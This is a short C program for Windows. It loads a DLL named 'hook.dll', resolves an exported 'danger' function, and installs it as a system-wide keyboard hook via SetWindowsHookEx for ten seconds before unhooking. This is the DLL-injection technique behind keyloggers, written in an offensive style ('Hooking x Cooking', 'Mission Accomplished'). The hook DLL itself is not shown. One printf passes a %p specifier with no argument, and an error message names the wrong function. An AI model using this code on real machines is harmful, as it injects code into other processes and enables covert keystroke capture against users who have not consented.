#include <stdio.h>
#include <windows.h>

int main() {
	typedef void(*DANGER)(void);
	HMODULE lib = LoadLibraryA("hook.dll");
	if (!lib) {
		printf("[-] Failed Loading hook.dll\n");
	}
	else {
		printf("[+] Loaded hook.dll\n");
	}
	DANGER dangerFunc;
	dangerFunc = (DANGER) GetProcAddress(lib, "danger");
	if (dangerFunc) {
		printf("[+] Address of Danger Function: 0x%p\n");
	}
	else {
		printf("[-] Failed Getting the Address of GetProcAddress\n");
	}
	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)dangerFunc, lib, 0);
	printf("[+] Hooking x Cooking\n");
	Sleep(10 * 1000);
	if (UnhookWindowsHookEx(hook)) {
		printf("[+] Credits to Unhooking by UnhookWindowsHookEx()!\n");
	}
	else {
		printf("[-] Failed Unhooking\n");
	}
	printf("[=] Mission Accomplished\n");
	
	return 0;

}
